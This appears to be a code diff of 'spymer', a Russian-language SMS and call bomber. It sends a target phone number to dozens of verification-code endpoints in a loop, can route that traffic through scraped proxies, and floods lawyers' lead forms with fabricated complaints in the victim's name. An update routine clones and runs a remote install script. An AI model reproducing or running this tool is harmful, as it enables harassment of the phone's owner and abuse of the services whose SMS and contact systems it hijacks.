-											_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
-											_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-											_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
-											_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-											_phone = phone
-											_email = _name+f'{iteration}'+'@gmail.com'
-											email = _email
-											info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
-											os.system('cls' if os.name=='nt' else 'clear')
-											print(logo)
-											print(info)
-											if _phone[0] == '9':
-												_phone = '7'+_phone
-											if proxy=="localhost":
-												proxies=None
-											else:
-												proxies="{'"+ssl+"':'"+ip+"'}"
-											while iteration < count:
-												try:
-													try:
-														requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
-													except:
-														pass
-													try:
-														requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
-													except:
-														pass
-													try:
-														requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
-													except:
-														pass
-														
-													iteration += 1
-													print(('{} круг.').format(iteration))
-												except KeyboardInterrupt:
-													info = Fore.RED+"\nСпамер остановлен.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
-													main()
-												except:
-													pass
-											info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
-								except:
-									info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL
-
-
-						except:
-							info = Fore.RED+"\nНекорректно введен номер телефона!"+Style.RESET_ALL
-					except KeyboardInterrupt:
-						info = Fore.RED+"\nОтменено!"+Style.RESET_ALL
-					except:
-						info = Fore.RED+"\nНекорректный ввод данных!"+Style.RESET_ALL
-			
-
-
-			elif input1 == "2":
 				print ("Введите номер:")
 				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-				if phone[0] == '+':
-					phone = phone[1:]
-				if phone[0] == '8':
-					phone = '7'+phone[1:]
-				if phone[0] == '9':
-					phone = '7'+phone
+				make7phone()
 				try:
 					if int(phone):
 						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
@@ -1099,297 +766,333 @@ def Main():
 							elif result == "error":
 								info = Fore.RED+"Ошибка"+Style.RESET_ALL
 				except:
-					info = Fore.RED+"\nНекорректно введен телефон!".format(phone)+Style.RESET_ALL
-			
-			elif input1 == "3":
-				print ("Войдите в телефон для проверки:")
-				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-				if phone[0] == '+':
-					phone = phone[1:]
-				if phone[0] == '8':
-					phone = '7'+phone[1:]
-				if phone[0] == '9':
-					phone = '7'+phone
-				try:
-					if int(phone):
-						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
-						if int(id) > 0:
-							info = Fore.GREEN+"\nТелефон {} находится в антиспам листе.".format(phone)+Style.RESET_ALL
-						elif int(id) == 0:
-							info = Fore.RED+"\nТелефон {} не находится в антиспам листе.".format(phone)+Style.RESET_ALL
-				except:
 					info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
-			
-			elif input1 == "4":
-				try:
-					print("Введите  номер:")
-					phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-					try:
-						if int(phone):
-							print("Введите имя:")
-							name = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-							if name == "":
-								info = Fore.RED+"\nIncorrect name entered!"+Style.RESET_ALL
-								main()
-							print("Введите жалобу (обращение, которое потерпевший якобы адресует адвокатам):")
-							text = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-							if text == "":
-								info = Fore.RED+"\nНекорректно введена жалоба!"+Style.RESET_ALL
-								main()
-							try:
-								_phone=phone
-								_text=text
-								_name=name
-								if _phone[0] == '+':
-									_phone = _phone[1:]
-								if _phone[0] == '8':
-									_phone = '7'+_phone[1:]
-								if _phone[0] == '9':
-									_phone = '7'+_phone
-								id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': _phone}).json()["id"]
-								if int(id) > 0:
-									info = Fore.RED+"\nТелефон находится в антиспам листе."+Style.RESET_ALL
-									main()
-								elif int(id)==0:
-									_email = ''
-									for x in range(12):
-										_email = _email + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-									_phoneVodaonline = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7 (999) 666-99-33'
-									_phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(777)777-77-77'
-									
-									info="Телефон: {}\nИмя: {}\nЖалоба: {}\nСпамер запущен.\nДля отмены нажмите Ctrl+C".format(phone, name, text)
-									os.system('cls' if os.name=='nt' else 'clear')
-									print(logo)
-									print(info)
-									proxies=None
-									try:
-										try:
-											vodaonline = requests.post('https://www.vodaonline.ru/local/components/shantilab/feedback.form/ajax.php', data={'sessid': '*', 'NAME': _name, 'PHONE': _phoneVodaonline}, proxies=proxies)
-											if vodaonline.status_code == 200:
-												print(Fore.GREEN + 'www.vodaonline.ru: sent')
-											else:
-												print(Fore.RED + 'www.vodaonline.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											yurmoscow = requests.post('https://yur-moscow.ru/ajax_call_me.php', data={'param1': _phone, 'param3': _text, 'param2': _name}, proxies=proxies)
-											if yurmoscow.status_code == 200:
-												print(Fore.GREEN + 'yur-moscow.ru: sent')
-											else:
-												print(Fore.RED + 'yur-moscow.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': _text,'name': _name,'city':'Москва','tel': _phoneBukvaprava,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'}, proxies=proxies)
-											if bukvaprava.status_code == 200:
-												print(Fore.GREEN + 'bukvaprava.ru: sent')
-											else:
-												print(Fore.RED + 'bukvaprava.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											yuristonline = requests.post('https://www.yurist-online.net/lead_question', data={'region':'27','question': _text,'name': _name,'phone': _phone,'email':'','partner_id':'13'}, proxies=proxies)
-											if yuristonline.status_code == 200:
-												print(Fore.GREEN + 'www.yurist-online.net: sent')
-											else:
-												print(Fore.RED + 'www.yurist-online.net: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											blablabla = requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php', data={'custom_U22127':_phoneVodaonline}, proxies=proxies)
-											if blablabla.status_code == 200:
-												print(Fore.GREEN + 'юрист-авгрупп.рф: sent')
-											else:
-												print(Fore.RED + 'юрист-авгрупп.рф: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''}, proxies=proxies)
-											if nicecream.status_code == 200:
-												print(Fore.GREEN + 'nice-cream.ru: sent')
-											else:
-												print(Fore.RED + 'nice-cream.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:4]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'}, proxies=proxies)
-											if rossovet.status_code == 200:
-												print(Fore.GREEN + 'rossovet.ru: sent')
-											else:
-												print(Fore.RED + 'rossovet.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											yuridkons = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text}, proxies=proxies)
-											if yuridkons.status_code == 200:
-												print(Fore.GREEN + 'yuridicheskaya-konsultaciya.com: sent')
-											else:
-												print(Fore.RED + 'yuridicheskaya-konsultaciya.com: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'}, proxies=proxies)
-											if epleads.status_code == 200:
-												print(Fore.GREEN + 'epleads.ru: sent')
-											else:
-												print(Fore.RED + 'epleads.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											pravonedv = requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1', data={'email': _email+'@mail.ru','phone': _phoneVodaonline,'location': 'Москва, Россия','name': _name,'offer': '0','ip': '263.87.162.98','device': 'desktop','token': '*','template': 'two_page3','referrer': 'https://yandex.ru/clck/','domain': 'pravonedv.ru','wm_id': '548','url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'}, proxies=proxies)
-											if pravonedv.status_code == 200:
-												print(Fore.GREEN + 'pravonedv.ru: sent')
-											else:
-												print(Fore.RED + 'pravonedv.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											rdftgbhnj = requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': _name,'tel-231': _phone,'textarea-472': _text,'hidden-278': 'Главная'}, proxies=proxies)
-											if rdftgbhnj.status_code == 200:
-												print(Fore.GREEN + 'гос-юристы.рф: sent')
-											else:
-												print(Fore.RED + 'гос-юристы.рф: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											gurist = requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback', data={'_wpcf7': '3591','_wpcf7_version': '5.0','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f3591-o1','_wpcf7_container_post': '0','your-name': _name,'tel-147': _text}, proxies=proxies)
-											if gurist.status_code == 200:
-												print(Fore.GREEN + 'gurist.ru: sent')
-											else:
-												print(Fore.RED + 'gurist.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											beeline = requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/', data={'leadName':'PodborSim','phone':_phone[1:11],'region':'98140'}, proxies=proxies)
-											if beeline.status_code == 200:
-												print(Fore.GREEN + 'moskva.beeline.ru: sent')
-											else:
-												print(Fore.RED + 'moskva.beeline.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											advokatmakeev = requests.post('https://advokatmakeev.ru/form.php', data={'oname': _name,'otel': _phoneVodaonline,'omail': '','omess': _text,'otype': '1'}, proxies=proxies)
-											if advokatmakeev.status_code == 200:
-												print(Fore.GREEN + 'advokatmakeev.ru: sent')
-											else:
-												print(Fore.RED + 'advokatmakeev.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											mkamsk = requests.post('http://mkamsk.ru/apply_auto_form', data={'Form[9]': _name,'Form[12]': _phone,'Form[11]': _text,'url': 'http://mkamsk.ru/','check': 'check'}, proxies=proxies)
-											if mkamsk.status_code == 200:
-												print(Fore.GREEN + 'mkamsk.ru: sent')
-											else:
-												print(Fore.RED + 'mkamsk.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											usachev = requests.post('https://usachev.vip/wp-admin/admin-ajax.php', data={'action': 'bazz_widget_action','phone': '+'+_phone,'name': ''}, proxies=proxies)
-											if usachev.status_code == 200:
-												print(Fore.GREEN + 'usachev.vip: sent')
-											else:
-												print(Fore.RED + 'usachev.vip: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											pravosfera = requests.post('http://pravo-sfera.ru/auxpage_zayavk/', data={'c_name': _name, 'c_tel' : _phoneVodaonline, 'quest': _text, 'uest_go': 'Задать вопрос'}, proxies=proxies)
-											if usachev.status_code == 200:
-												print(Fore.GREEN + 'pravo-sfera.ru: sent')
-											else:
-												print(Fore.RED + 'pravo-sfera.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											uristexpert24 = requests.post('https://urist-expert24.ru/send-lead/', data={'name': _name, 'phone': _phoneVodaonline, 'form-name': 'Заказ обратного звонка'}, proxies=proxies)
-											if uristexpert24.status_code == 200:
-												print(Fore.GREEN + 'urist-expert24.ru: sent')
-											else:
-												print(Fore.RED + 'urist-expert24.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											lawdivorce = requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php', data={'ip_address': '','ip_country': '','ip_region': '','ip_city': '','url': '','action': 'lld_send_lead','text': _text,'name': _name,'telephone': '+'+_phoneBukvaprava,'city': 'Москва'}, proxies=proxies)
-											if lawdivorce.status_code == 200:
-												print(Fore.GREEN + 'law-divorce.ru: sent')
-											else:
-												print(Fore.RED + 'law-divorce.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											gosurist = requests.post('http://www.gos-urist.ru/send.php', {'name': _name, 'code': _phone[1:4], 'phone': _phone[4:11], 'issue': _text}, proxies=proxies)
-											if gosurist.status_code == 200:
-												print(Fore.GREEN + 'www.gos-urist.ru: sent')
-											else:
-												print(Fore.RED + 'www.gos-urist.ruчё: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											ur9911030 = requests.post('http://9911030.ru/orderform.php', {'name': _name, 'phone': _phone, 'message': _text}, proxies=proxies)
-											if ur9911030.status_code == 200:
-												print(Fore.GREEN + '9911030.ru: sent')
-											else:
-												print(Fore.RED + '9911030.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										try:
-											findclone = requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone}, proxies=proxies)
-											if ur9911030.status_code == 200:
-												print(Fore.GREEN + 'findclone.ru: sent')
-											else:
-												print(Fore.RED + 'findclone.ru: not sent')
-										except:
-											print(Fore.RED + 'SERVICE DIED')
-										print(Style.RESET_ALL)
-									except KeyboardInterrupt:
-										info = Fore.RED+"\nОтменено."+Style.RESET_ALL
-										main()
-									except:
-										pass
-									info = Fore.BLUE+"\nГотово."+Style.RESET_ALL
-									print(Fore.BLUE+"Готово."+Style.RESET_ALL)
-									time.sleep(5)
-							except:
-								info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
-					
-					except:
-						info = Fore.RED+"\nНекорректно введен телефон!"+Style.RESET_ALL
-				except KeyboardInterrupt:
-					info = Fore.RED+"\nОтменено!"+Style.RESET_ALL
-				except:
-					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
-			
-			elif input1 == "5":
+
+			def updateproxy():
+				global proxy
+				global ssl
+				global info
 				try:
 					print ("Введите http(s)://IP:port proxy.")
 					print ("Пример: "+Fore.GREEN+"https://123.45.6.78:8080"+Style.RESET_ALL)
 					print ("Для отмены нажмите Ctrl+C")
-					proxy = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
-					if proxy[:5]=="https":
+					prox = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+					if prox[:5]=="https":
 						ssl="https"
-						ip=proxy[8:]
-						
-					elif proxy[:5]=="http:":
+						proxy=prox[8:]
+					elif prox[:5]=="http:":
 						ssl="http"
-						ip=proxy[7:]
-
-					
-				except KeyboardInterrupt:
-					info = Fore.RED+"\nОтменено."+Style.RESET_ALL
-					
+						proxy=prox[7:]
+					else:
+						info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
+						proxy = "localhost"
 				except:
 					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
 					proxy = "localhost"
-			
-			elif input1 == "6":
+
+			def generateproxy():
+				global ssl
+				global proxy
+				print("Подождите, ищем подходящий прокси...")
+				collector = proxyscrape.create_collector('default', 'http')
+				prox = collector.get_proxy({'anonymous':True, 'type':'https', 'code':'ru'})
+				ssl=prox[5]
+				proxy="{}:{}".format(prox[0],prox[1])
+
+			def make7phone():
+				global phone
+				if phone[0] == '+':
+					phone = phone[1:]
+				elif phone[0] == '8':
+					phone = '7'+phone[1:]
+				elif phone[0] == '9':
+					phone = '7'+phone
+
+			def addparams():
+				global name
+				global password
+				global email
+				name = ''
+				for x in range(12):
+					name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+					password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+					email = "{}@gmail.com".format(name)
+
+			def update():
 				a=input("Вы уверены, что хотите обновить? (y/n) ")
 				if a=="y":
-					cmd = os.system("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")
+					os.system("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")
 					exit()
 				else:
 					print("Отменено")
-			
-			elif input1 == "7":
-				print (Fore.BLUE+"\nДо скорой встречи!)\n"+Style.RESET_ALL)
+
+			def onesend():
+				global phone
+				global name
+				global password
+				global email
+				global ssl
+				global proxy
+				global info
+				global proxies
+				clear()
+				logo()
+				print(info)
+				print('Введите телефон ("Enter" - отмена):')
+				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+				if int(phone):
+					print('Введите количество кругов ("Enter" - отмена):')
+					count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
+					if int(count):
+						count=int(count)
+						make7phone()
+						iteration = 0
+						id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
+						if int(id) > 0:
+							info = Fore.RED+"\nНомер телефона находится в антиспам листе."+Style.RESET_ALL
+						elif int(id)==0:
+							addparams()
+							info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
+							clear()
+							logo()
+							print(info)
+							if proxy=="localhost":
+								proxies=None
+							else:
+								proxies="{'"+ssl+"':'"+proxy+"'}"
+							while iteration < count:
+								addparams()
+								sms()
+								iteration+=1
+								print("{} круг пройден.".format(iteration))
+							info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
+
+			def filesend():
+				global phone
+				global name
+				global password
+				global email
+				global ssl
+				global proxy
+				global info
+				global proxies
+				clear()
+				logo()
+				print(info)
+				print("Введите путь к файлу: ")
+				print("(Папка с файлом должна находиться в домашней дирректории!)")
+				print("Не знаешь, как создать файл в терминале - воспользуйся токеном!")
